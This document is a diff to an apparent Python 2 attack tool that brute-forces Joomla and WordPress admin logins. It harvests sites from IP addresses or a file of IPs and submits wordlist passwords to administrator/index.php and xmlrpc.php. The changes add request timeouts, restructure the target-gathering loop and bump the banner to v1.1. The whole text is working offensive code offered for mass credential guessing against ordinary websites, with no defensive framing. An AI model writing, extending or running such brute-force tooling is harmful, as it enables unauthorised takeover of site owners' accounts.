@@ -26,14 +26,15 @@ class Jmbrute(object) :
   """
   Class to brute force joomla
   """
-  def __init__(self, website) :
+  def __init__(self, website, timeout=10) :
     self.website = website
     # Making a requests sesion object
     self.req = requests.session()
+    self.timeout = timeout
 
   def __makeGet(self, url) :
     try :
-      return self.req.get(url).text
+      return self.req.get(url, timeout=self.timeout).text
     except :
       pass
 
@@ -54,7 +55,7 @@ class Jmbrute(object) :
         'return'   : 'aW5kZXgucGhw'
         }
     try :
-      self.req.post(self.website, data=dat)
+      self.req.post(self.website, data=dat, timeout=self.timeout)
     except :
       pass
   def checklog(self) :
@@ -162,7 +163,6 @@ parser.add_argument('-wp', '--wordpress', help='Brute force wordpress websites',
 parser.add_argument('-x', '--allwebsites', help='Brute force all', action='store_true')
 parser.add_argument('-sm', '--smart', help='Detect joomla and wordpress scripts', action='store_true')
 parser.add_argument('-hl', '--hidelogo', help='Hide logo', action='store_true')
-parser.add_argument('-to', '--timeout', help='Set request timeout', dest='timeout')
 args = parser.parse_args()
 jmlist = []
 wplist = []
@@ -176,7 +176,7 @@ if not args.hidelogo :
   | $$  $$$| $$  /$$$$$$$|  $$$$$$   | $$    | $$$$$$$$| $$  \__/      | $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$
   | $$\  $ | $$ /$$__  $$ \____  $$  | $$ /$$| $$_____/| $$            | $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/
   | $$ \/  | $$|  $$$$$$$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$            | $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$
-  |__/     |__/ \_______/|_______/    \___/   \_______/|__/            |_______/ |__/       \______/    \___/   \_______/ v1.0
+  |__/     |__/ \_______/|_______/    \___/   \_______/|__/            |_______/ |__/       \______/    \___/   \_______/ v1.1
 
   """+Colors.ENDC
   # Just for that the text will be in center
@@ -219,10 +219,20 @@ else :
       wplist = getWordpress(args.ip)
   elif args.fi :
     for ip in file2list(args.fi) :
-      if args.verbose : print '[*] Grabbing Joomla from', ip
-      if args.joomla : jmlist.extend(getJoomla(ip))
-      if args.verbose : print '[*] Grabbing wordpress from', ip
-      if args.wordpress : wplist.extend(getWordpress(ip))
+      if args.joomla :
+        if args.verbose : print '[*] Grabbing Joomla from', ip 
+        jmlist.extend(getJoomla(ip))
+      elif args.wordpress : 
+        if args.verbose : print '[*] Grabbing wordpress from', ip
+        wplist.extend(getWordpress(ip))
+      elif args.allwebsites :
+        if args.verbose : print '[*] Grabbing Joomla from', ip 
+        jmlist.extend(getJoomla(ip))
+        if args.verbose : print '[*] Grabbing wordpress from', ip
+        wplist.extend(getWordpress(ip))
+  #~ if not args.timeout : thetimeout  = 10
+  #~ elif args.timeout : thetimeout = args.timeout
+  #~ print thetimeout
   passlist = file2list(args.wordl)
   wplist = addcontrol(wplist, 'xmlrpc.php')
   jmlist = addcontrol(jmlist, 'administrator/index.php')
